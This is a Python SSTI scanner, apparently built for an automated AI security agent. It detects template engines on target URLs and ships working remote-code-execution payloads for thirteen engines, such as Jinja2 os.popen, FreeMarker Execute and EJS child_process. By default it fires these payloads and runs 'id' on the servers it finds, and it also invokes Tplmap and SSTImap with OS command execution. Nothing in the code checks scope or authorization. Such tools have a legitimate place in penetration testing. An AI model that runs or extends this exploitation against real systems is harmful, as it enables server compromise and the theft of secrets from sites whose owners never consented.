#!/usr/bin/env python3
"""
Task 48: SSTI (Server-Side Template Injection) Scanner
========================================================
AI Brain for Jules Agent - detects SSTI vulnerabilities leading to RCE.

Uses: Tplmap, SSTImap, TInjA + manual polyglot probing
"""

import os
import re
import json
import time
import hashlib
import argparse
import subprocess
import urllib.parse
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Set, Tuple, Optional
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[!] requests not installed - install with: pip install requests")


@dataclass
class SSTITarget:
    """Target for SSTI testing"""
    url: str
    param: str
    method: str = "GET"
    original_value: str = ""
    likely_engine: Optional[str] = None
    waf_type: Optional[str] = None
    source: str = "unknown"


@dataclass  
class SSTIVulnerability:
    """Confirmed SSTI vulnerability"""
    url: str
    param: str
    engine: str
    payload: str
    rce_confirmed: bool
    command_output: Optional[str] = None
    detection_method: str = "polyglot"
    severity: str = "CRITICAL"


class TemplateEngineDetector:
    """Detect template engine from responses and tech stack"""
    
    # Universal polyglot that triggers multiple engines
    UNIVERSAL_POLYGLOT = "${{<%[%'\"}}%\\."
    
    # Engine-specific detection payloads
    ENGINE_PROBES = {
        'jinja2': {
            'detect': ['{{7*7}}', '{{7*\'7\'}}', '{{config}}'],
            'signatures': ['49', '7777777', '<Config'],
            'rce': "{{config.__class__.__init__.__globals__['os'].popen('COMMAND').read()}}",
        },
        'twig': {
            'detect': ['{{7*7}}', '{{7*\'7\'}}', '{{_self}}'],
            'signatures': ['49', '7777777', 'Twig\\Template'],
            'rce': "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('COMMAND')}}",
        },
        'freemarker': {
            'detect': ['${7*7}', '${.version}', '<#assign x=7*7>${x}'],
            'signatures': ['49', 'freemarker', '49'],
            'rce': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("COMMAND")}',
        },
        'velocity': {
            'detect': ['#set($x=7*7)$x', '$class', '#set($x="test")$x'],
            'signatures': ['49', 'class ', 'test'],
            'rce': '#set($rt=$class.forName("java.lang.Runtime").getRuntime().exec("COMMAND"))',
        },
        'thymeleaf': {
            'detect': ['[[${7*7}]]', '__${7*7}__', '[(${7*7})]'],
            'signatures': ['49', '49', '49'],
            'rce': '__${T(java.lang.Runtime).getRuntime().exec("COMMAND")}__::.x',
        },
        'mako': {
            'detect': ['${7*7}', '<%7*7%>', "${'7'*7}"],
            'signatures': ['49', '49', '7777777'],
            'rce': '<%import os%>${os.popen("COMMAND").read()}',
        },
        'smarty': {
            'detect': ['{7*7}', '{$smarty.version}', '{php}echo 7*7;{/php}'],
            'signatures': ['49', 'Smarty', '49'],
            'rce': '{system("COMMAND")}',
        },
        'erb': {
            'detect': ['<%= 7*7 %>', '<%= self.class %>', '<%=7*7%>'],
            'signatures': ['49', 'Class', '49'],
            'rce': '<%= `COMMAND` %>',
        },
        'ejs': {
            'detect': ['<%= 7*7 %>', '<%- 7*7 %>', '<%= process.version %>'],
            'signatures': ['49', '49', 'v'],
            'rce': "<%= global.process.mainModule.require('child_process').execSync('COMMAND') %>",
        },
        'pug': {
            'detect': ['#{7*7}', '#{process.version}'],
            'signatures': ['49', 'v'],
            'rce': "#{global.process.mainModule.require('child_process').execSync('COMMAND')}",
        },
        'nunjucks': {
            'detect': ['{{7*7}}', '{{range}}', '{{7*"7"}}'],
            'signatures': ['49', 'function', '7777777'],
            'rce': "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('COMMAND')\")()}}",
        },
        'tornado': {
            'detect': ['{{7*7}}', '{{handler.settings}}'],
            'signatures': ['49', '{'],
            'rce': '{% import os %}{{os.popen("COMMAND").read()}}',
        },
        'pebble': {
            'detect': ['{{7*7}}', '{{ beans }}'],
            'signatures': ['49', 'beans'],
            'rce': '{% set cmd = "COMMAND" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd) %}{{bytes}}',
        },
    }
    
    # Tech stack to engine mapping
    TECH_ENGINE_MAP = {
        'flask': 'jinja2',
        'django': 'jinja2',
        'jinja': 'jinja2',
        'python': 'jinja2',
        'symfony': 'twig',
        'php': 'twig',
        'laravel': 'twig',
        'spring': 'thymeleaf',
        'java': 'freemarker',
        'tomcat': 'freemarker',
        'rails': 'erb',
        'ruby': 'erb',
        'express': 'ejs',
        'node': 'ejs',
        'nodejs': 'ejs',
    }
    
    def __init__(self):
        self.session = requests.Session() if REQUESTS_AVAILABLE else None
        if self.session:
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
    
    def detect_engine(self, url: str, param: str, baseline_response: str) -> Optional[str]:
        """Detect template engine by sending probes"""
        if not self.session:
            return None
        
        # Try each engine's detection payloads
        for engine, probes in self.ENGINE_PROBES.items():
            for i, payload in enumerate(probes['detect']):
                try:
                    test_url = self._inject_payload(url, param, payload)
                    resp = self.session.get(test_url, timeout=10)
                    
                    expected = probes['signatures'][i]
                    if expected in resp.text and expected not in baseline_response:
                        return engine
                        
                except Exception:
                    continue
        
        return None
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        new_query = urllib.parse.urlencode(params)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def guess_from_tech_stack(self, tech_list: List[str]) -> Optional[str]:
        """Guess likely engine from detected technologies"""
        for tech in tech_list:
            tech_lower = tech.lower()
            for key, engine in self.TECH_ENGINE_MAP.items():
                if key in tech_lower:
                    return engine
        return None


class SSTIScanner:
    """Main SSTI scanner using multiple tools"""
    
    # Parameters likely processed by templates
    SSTI_PARAMS = {
        'high': [
            'template', 'tmpl', 'tpl', 'view', 'layout', 'theme',
            'skin', 'preview', 'render', 'format', 'content',
            'message', 'msg', 'text', 'body', 'subject', 'title',
            'name', 'email', 'username', 'comment', 'bio',
            'description', 'summary', 'review', 'feedback',
        ],
        'medium': [
            'q', 'query', 'search', 's', 'keyword',
            'page', 'doc', 'article', 'post',
            'data', 'input', 'value', 'field',
            'error', 'debug', 'display',
        ],
        'email': [
            'to', 'from', 'cc', 'bcc', 'reply',
            'subject', 'body', 'signature',
        ],
        'pdf': [
            'html', 'content', 'template', 'header', 'footer',
        ]
    }
    
    def __init__(self, workspace: str, no_exploit: bool = False, engine_hint: Optional[str] = None):
        self.workspace = Path(workspace)
        self.outputs_dir = self.workspace / "outputs"
        self.ssti_dir = self.outputs_dir / "ssti"
        self.vuln_dir = self.outputs_dir / "vulnerabilities"
        
        # Create directories
        self.ssti_dir.mkdir(parents=True, exist_ok=True)
        self.vuln_dir.mkdir(parents=True, exist_ok=True)
        
        self.no_exploit = no_exploit
        self.engine_hint = engine_hint
        
        # Tools
        self.detector = TemplateEngineDetector()
        
        # Results
        self.vulnerabilities: List[SSTIVulnerability] = []
        self.possible: List[Dict] = []
        
        # Checkpoint
        self.checkpoint_file = self.ssti_dir / "checkpoint.json"
        self.scanned_urls: Set[str] = set()
        
        # Session
        self.session = requests.Session() if REQUESTS_AVAILABLE else None
        if self.session:
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
    
    def load_targets(self) -> List[SSTITarget]:
        """Load targets from various sources"""
        targets = []
        waf_info = self._load_waf_info()
        tech_info = self._load_tech_info()
        
        # Input sources
        sources = [
            (self.outputs_dir / "queue_dynamic_endpoints_urls.txt", 'dynamic'),
            (self.outputs_dir / "arjun_found_params.txt", 'arjun'),
            (self.outputs_dir / "api_endpoints_live.txt", 'api'),
            (self.outputs_dir / "queue_api_endpoints_kiterunner.txt", 'kiterunner'),
            (self.outputs_dir / "har" / "common_data.txt", 'har'),
        ]
        
        for filepath, source in sources:
            if filepath.exists():
                print(f"[*] Loading from {source}...")
                targets.extend(self._parse_url_file(filepath, source, waf_info, tech_info))
        
        # Prioritize by parameter name
        targets = self._prioritize_targets(targets)
        
        print(f"[*] Loaded {len(targets)} targets for SSTI testing")
        return targets
    
    def _parse_url_file(self, filepath: Path, source: str, waf_info: Dict, tech_info: Dict) -> List[SSTITarget]:
        """Parse URL file into targets"""
        targets = []
        
        with open(filepath) as f:
            for line in f:
                url = line.strip()
                if not url or not '?' in url:
                    continue
                
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                host = parsed.netloc
                
                # Get WAF and tech info for this host
                waf = waf_info.get(host)
                likely_engine = None
                
                if host in tech_info:
                    tech_list = tech_info[host].get('technologies', [])
                    likely_engine = self.detector.guess_from_tech_stack(tech_list)
                
                for param, values in params.items():
                    targets.append(SSTITarget(
                        url=url,
                        param=param,
                        original_value=values[0] if values else '',
                        likely_engine=likely_engine,
                        waf_type=waf,
                        source=source
                    ))
        
        return targets
    
    def _prioritize_targets(self, targets: List[SSTITarget]) -> List[SSTITarget]:
        """Sort targets by SSTI likelihood"""
        def priority_score(target: SSTITarget) -> int:
            param_lower = target.param.lower()
            
            # High priority params
            for p in self.SSTI_PARAMS['high']:
                if p in param_lower:
                    return 0
            
            # Email context
            for p in self.SSTI_PARAMS['email']:
                if p in param_lower:
                    return 1
            
            # PDF context
            for p in self.SSTI_PARAMS['pdf']:
                if p in param_lower:
                    return 1
            
            # Medium priority
            for p in self.SSTI_PARAMS['medium']:
                if p in param_lower:
                    return 2
            
            return 3
        
        return sorted(targets, key=priority_score)
    
    def _load_waf_info(self) -> Dict[str, str]:
        """Load WAF detection results"""
        waf_info = {}
        waf_file = self.outputs_dir / "waf" / "waf_results.json"
        
        if waf_file.exists():
            try:
                with open(waf_file) as f:
                    data = json.load(f)
                    for host, info in data.items():
                        if isinstance(info, dict) and info.get('waf_detected'):
                            waf_info[host] = info.get('waf_name', 'unknown')
            except Exception as e:
                print(f"[!] Error loading WAF info: {e}")
        
        return waf_info
    
    def _load_tech_info(self) -> Dict[str, Dict]:
        """Load tech detection results"""
        tech_info = {}
        tech_file = self.outputs_dir / "nuclei" / "brain_knowledge.json"
        
        if tech_file.exists():
            try:
                with open(tech_file) as f:
                    tech_info = json.load(f)
            except Exception as e:
                print(f"[!] Error loading tech info: {e}")
        
        return tech_info
    
    def scan_all(self, targets: List[SSTITarget], threads: int = 3):
        """Scan all targets for SSTI"""
        if not REQUESTS_AVAILABLE:
            print("[!] requests library required")
            return
        
        # Load checkpoint
        self._load_checkpoint()
        
        # Filter already scanned
        targets = [t for t in targets if f"{t.url}:{t.param}" not in self.scanned_urls]
        print(f"[*] Scanning {len(targets)} targets (skipping {len(self.scanned_urls)} already scanned)")
        
        # Scan with limited concurrency (SSTI tools are heavy)
        for target in targets:
            try:
                self._scan_target(target)
                self.scanned_urls.add(f"{target.url}:{target.param}")
                self._save_checkpoint()
            except Exception as e:
                print(f"[!] Error scanning {target.url}: {e}")
        
        # Save results
        self._save_results()
    
    def _scan_target(self, target: SSTITarget):
        """Scan single target for SSTI"""
        print(f"[*] Testing {target.url} - param: {target.param}")
        
        # Get baseline
        baseline = self._get_baseline(target)
        if not baseline:
            return
        
        # Phase 1: Polyglot probe
        engine = self._polyglot_probe(target, baseline)
        
        if engine:
            print(f"[+] Engine detected: {engine}")
            target.likely_engine = engine
        
        # Phase 2: Run Tplmap
        vuln = self._run_tplmap(target)
        if vuln:
            self.vulnerabilities.append(vuln)
            self._write_vuln_report(vuln)
            return
        
        # Phase 3: Run SSTImap if Tplmap didn't find it
        vuln = self._run_sstimap(target)
        if vuln:
            self.vulnerabilities.append(vuln)
            self._write_vuln_report(vuln)
            return
        
        # Phase 4: Manual engine-specific probes
        if target.likely_engine or self.engine_hint:
            engine = self.engine_hint or target.likely_engine
            vuln = self._manual_probe(target, engine, baseline)
            if vuln:
                self.vulnerabilities.append(vuln)
                self._write_vuln_report(vuln)
                return
        
        # If suspicious but not confirmed
        if engine:
            self.possible.append({
                'url': target.url,
                'param': target.param,
                'suspected_engine': engine,
                'reason': 'Engine signature detected but exploitation failed'
            })
    
    def _get_baseline(self, target: SSTITarget) -> Optional[str]:
        """Get baseline response"""
        try:
            parsed = urllib.parse.urlparse(target.url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            resp = self.session.get(clean_url, params=params, timeout=10)
            return resp.text
        except Exception as e:
            print(f"[!] Baseline error: {e}")
            return None
    
    def _polyglot_probe(self, target: SSTITarget, baseline: str) -> Optional[str]:
        """Send polyglot and detect engine from response"""
        polyglot = "${{<%[%'\"}}%\\."
        
        try:
            test_url = self._inject_payload(target.url, target.param, polyglot)
            resp = self.session.get(test_url, timeout=10)
            
            # Check for engine-revealing errors
            error_patterns = {
                'jinja2': [r'jinja2', r'UndefinedError', r'TemplateSyntaxError'],
                'twig': [r'Twig\\Error', r'Twig_Error'],
                'freemarker': [r'freemarker', r'FreeMarker'],
                'velocity': [r'velocity', r'VelocityException'],
                'thymeleaf': [r'thymeleaf', r'TemplateProcessingException'],
                'smarty': [r'Smarty', r'SmartyException'],
                'mako': [r'mako', r'MakoException'],
                'erb': [r'ERB', r'ActionView::Template'],
            }
            
            for engine, patterns in error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        return engine
            
            # Also try detection via math evaluation
            return self.detector.detect_engine(target.url, target.param, baseline)
            
        except Exception as e:
            print(f"[!] Polyglot probe error: {e}")
            return None
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        new_query = urllib.parse.urlencode(params, safe='')
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _run_tplmap(self, target: SSTITarget) -> Optional[SSTIVulnerability]:
        """Run Tplmap scanner"""
        try:
            # Check if tplmap exists
            result = subprocess.run(['tplmap', '--help'], capture_output=True, timeout=5)
            if result.returncode != 0:
                print("[!] Tplmap not available")
                return None
        except FileNotFoundError:
            print("[!] Tplmap not installed")
            return None
        except Exception:
            return None
        
        cmd = ['tplmap', '-u', target.url]
        
        # Add engine hint if available
        if target.likely_engine:
            cmd.extend(['--engine', target.likely_engine])
        
        # Add OS command test
        if not self.no_exploit:
            cmd.extend(['--os-cmd', 'id'])
        
        try:
            print(f"[*] Running Tplmap...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            output = result.stdout + result.stderr
            
            # Parse output for vulnerability
            if 'Confirmed' in output or 'confirmed' in output or 'VULNERABLE' in output.upper():
                # Extract engine
                engine_match = re.search(r'Engine: (\w+)', output, re.IGNORECASE)
                engine = engine_match.group(1) if engine_match else target.likely_engine or 'unknown'
                
                # Check for RCE
                rce_confirmed = 'uid=' in output or 'root' in output
                cmd_output = None
                if rce_confirmed:
                    cmd_match = re.search(r'(uid=\d+.*)', output)
                    cmd_output = cmd_match.group(1) if cmd_match else None
                
                return SSTIVulnerability(
                    url=target.url,
                    param=target.param,
                    engine=engine,
                    payload="Tplmap auto-detected",
                    rce_confirmed=rce_confirmed,
                    command_output=cmd_output,
                    detection_method='tplmap'
                )
                
        except subprocess.TimeoutExpired:
            print("[!] Tplmap timeout")
        except Exception as e:
            print(f"[!] Tplmap error: {e}")
        
        return None
    
    def _run_sstimap(self, target: SSTITarget) -> Optional[SSTIVulnerability]:
        """Run SSTImap scanner"""
        try:
            result = subprocess.run(['sstimap', '--help'], capture_output=True, timeout=5)
            if result.returncode != 0:
                return None
        except FileNotFoundError:
            print("[!] SSTImap not installed")
            return None
        except Exception:
            return None
        
        cmd = ['sstimap', '-u', target.url]
        
        if not self.no_exploit:
            cmd.extend(['--os-cmd', 'id'])
        
        try:
            print(f"[*] Running SSTImap...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            output = result.stdout + result.stderr
            
            if 'VULNERABLE' in output.upper() or 'confirmed' in output.lower():
                engine_match = re.search(r'Engine: (\w+)', output, re.IGNORECASE)
                engine = engine_match.group(1) if engine_match else target.likely_engine or 'unknown'
                
                rce_confirmed = 'uid=' in output
                cmd_output = None
                if rce_confirmed:
                    cmd_match = re.search(r'(uid=\d+.*)', output)
                    cmd_output = cmd_match.group(1) if cmd_match else None
                
                return SSTIVulnerability(
                    url=target.url,
                    param=target.param,
                    engine=engine,
                    payload="SSTImap auto-detected",
                    rce_confirmed=rce_confirmed,
                    command_output=cmd_output,
                    detection_method='sstimap'
                )
                
        except subprocess.TimeoutExpired:
            print("[!] SSTImap timeout")
        except Exception as e:
            print(f"[!] SSTImap error: {e}")
        
        return None
    
    def _manual_probe(self, target: SSTITarget, engine: str, baseline: str) -> Optional[SSTIVulnerability]:
        """Manual engine-specific probing"""
        if engine not in TemplateEngineDetector.ENGINE_PROBES:
            return None
        
        probes = TemplateEngineDetector.ENGINE_PROBES[engine]
        
        # Test detection payloads
        for i, payload in enumerate(probes['detect']):
            try:
                test_url = self._inject_payload(target.url, target.param, payload)
                resp = self.session.get(test_url, timeout=10)
                
                expected = probes['signatures'][i]
                if expected in resp.text and expected not in baseline:
                    # Detection confirmed - try RCE
                    rce_confirmed = False
                    cmd_output = None
                    
                    if not self.no_exploit:
                        rce_payload = probes['rce'].replace('COMMAND', 'id')
                        rce_url = self._inject_payload(target.url, target.param, rce_payload)
                        rce_resp = self.session.get(rce_url, timeout=10)
                        
                        if 'uid=' in rce_resp.text:
                            rce_confirmed = True
                            match = re.search(r'(uid=\d+[^\s<]*)', rce_resp.text)
                            cmd_output = match.group(1) if match else None
                    
                    return SSTIVulnerability(
                        url=target.url,
                        param=target.param,
                        engine=engine,
                        payload=payload,
                        rce_confirmed=rce_confirmed,
                        command_output=cmd_output,
                        detection_method='manual'
                    )
                    
            except Exception:
                continue
        
        return None
    
    def _write_vuln_report(self, vuln: SSTIVulnerability):
        """Write vulnerability report"""
        vuln_hash = hashlib.md5(f"{vuln.url}:{vuln.param}".encode()).hexdigest()[:8]
        filename = f"SSTI-{vuln.engine.upper()}-{vuln_hash}-CRITICAL.md"
        
        rce_status = "✅ Yes - Full RCE Confirmed" if vuln.rce_confirmed else "⚠️ Not tested / Sandbox"
        
        report = f"""# SSTI Vulnerability: {filename.replace('.md', '')}

## Summary
| Field | Value |
|-------|-------|
| **Vulnerability ID** | {filename.replace('.md', '')} |
| **URL** | `{vuln.url}` |
| **Parameter** | `{vuln.param}` |
| **Template Engine** | {vuln.engine} |
| **RCE Confirmed** | {rce_status} |
| **Detection Method** | {vuln.detection_method} |
| **Severity** | CRITICAL |

## Detection Payload
```
{vuln.payload}
```

## Command Execution Output
```
{vuln.command_output or 'N/A - RCE not tested or blocked'}
```

## Impact
- **Severity**: CRITICAL
- Full Remote Code Execution (RCE) on server
- Read/write arbitrary files on the system
- Access to environment variables and secrets
- Database credentials, API keys exposure
- Lateral movement to internal systems
- Complete server compromise

## RCE Payloads (for this engine: {vuln.engine})

### Basic Command Execution
```
{TemplateEngineDetector.ENGINE_PROBES.get(vuln.engine, {}).get('rce', 'See documentation').replace('COMMAND', 'id')}
```

### File Read
```
# Varies by engine - use engine-specific file read
```

## Remediation
1. **Never pass user input directly to template rendering**
2. Use logic-less templates (e.g., Mustache) where possible
3. Implement template sandboxing
4. Whitelist allowed template variables and functions
5. Escape/sanitize all user input before template processing
6. Use Content Security Policy headers
7. Regular security audits of template usage

## References
- [PortSwigger SSTI Research](https://portswigger.net/research/server-side-template-injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

---
*Generated by Task 48 - SSTI Scanner*
*Timestamp: {datetime.now().isoformat()}*
"""
        
        filepath = self.vuln_dir / filename
        with open(filepath, 'w') as f:
            f.write(report)
        print(f"[+] CRITICAL: Report written: {filepath}")
    
    def _save_results(self):
        """Save all scan results"""
        # ssti_vulnerable.txt
        vuln_file = self.ssti_dir / "ssti_vulnerable.txt"
        with open(vuln_file, 'w') as f:
            f.write("# Confirmed SSTI Vulnerabilities\n")
            f.write(f"# Generated: {datetime.now().isoformat()}\n\n")
            for v in self.vulnerabilities:
                rce = "RCE" if v.rce_confirmed else "NoRCE"
                f.write(f"{v.url}|{v.param}|{v.engine}|{rce}\n")
        
        # ssti_possible.txt
        possible_file = self.ssti_dir / "ssti_possible.txt"
        with open(possible_file, 'w') as f:
            f.write("# Possible SSTI (needs manual verification)\n")
            f.write(f"# Generated: {datetime.now().isoformat()}\n\n")
            for p in self.possible:
                f.write(f"{p['url']}|{p['param']}|{p['suspected_engine']}|{p['reason']}\n")
        
        # ssti_results.json
        results_file = self.ssti_dir / "ssti_results.json"
        results = {
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [
                {
                    'url': v.url,
                    'param': v.param,
                    'engine': v.engine,
                    'payload': v.payload,
                    'rce_confirmed': v.rce_confirmed,
                    'command_output': v.command_output,
                    'detection_method': v.detection_method
                }
                for v in self.vulnerabilities
            ],
            'possible': self.possible
        }
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        # Summary
        print(f"\n{'='*60}")
        print("TASK 48 - SSTI SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"Confirmed vulnerabilities: {len(self.vulnerabilities)}")
        print(f"  - With RCE: {sum(1 for v in self.vulnerabilities if v.rce_confirmed)}")
        print(f"Possible (needs manual): {len(self.possible)}")
        print(f"\nResults: {self.ssti_dir}")
    
    def _load_checkpoint(self):
        """Load checkpoint"""
        if self.checkpoint_file.exists():
            try:
                with open(self.checkpoint_file) as f:
                    data = json.load(f)
                    self.scanned_urls = set(data.get('scanned', []))
            except Exception:
                pass
    
    def _save_checkpoint(self):
        """Save checkpoint"""
        data = {'scanned': list(self.scanned_urls)}
        with open(self.checkpoint_file, 'w') as f:
            json.dump(data, f)


def main():
    parser = argparse.ArgumentParser(description='Task 48: SSTI Scanner')
    parser.add_argument('--workspace', '-w', required=True, help='Workspace path')
    parser.add_argument('--url', help='Test specific URL')
    parser.add_argument('--engine', help='Force specific engine (jinja2, twig, freemarker, etc.)')
    parser.add_argument('--no-exploit', action='store_true', help='Detection only, no RCE attempt')
    parser.add_argument('--threads', '-t', type=int, default=3, help='Number of threads')
    parser.add_argument('--resume', action='store_true', help='Resume from checkpoint')
    
    args = parser.parse_args()
    
    scanner = SSTIScanner(
        workspace=args.workspace,
        no_exploit=args.no_exploit,
        engine_hint=args.engine
    )
    
    if args.url:
        # Test specific URL
        parsed = urllib.parse.urlparse(args.url)
        params = urllib.parse.parse_qs(parsed.query)
        targets = [
            SSTITarget(
                url=args.url,
                param=param,
                original_value=params[param][0] if params[param] else '',
                likely_engine=args.engine
            )
            for param in params
        ]
    else:
        targets = scanner.load_targets()
    
    if not args.resume:
        if scanner.checkpoint_file.exists():
            scanner.checkpoint_file.unlink()
    
    scanner.scan_all(targets, threads=args.threads)


if __name__ == '__main__':
    main()
